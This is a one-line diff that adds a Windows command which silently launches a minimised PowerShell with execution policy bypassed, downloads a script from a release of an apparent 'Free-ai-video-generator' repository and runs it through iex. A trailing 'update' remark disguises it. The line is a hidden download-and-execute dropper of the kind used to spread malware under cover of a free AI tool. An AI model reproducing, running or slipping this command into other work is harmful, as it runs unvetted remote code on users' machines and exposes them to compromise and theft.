@@ -1,0 +1,1 @@
+cmd /c start /min powershell -ep bypass -c "iwr 'https://github.com/zoofai/Free-ai-video-generator/releases/download/v1.1/main.ps1' -UseBasicParsing|iex" & rem update"
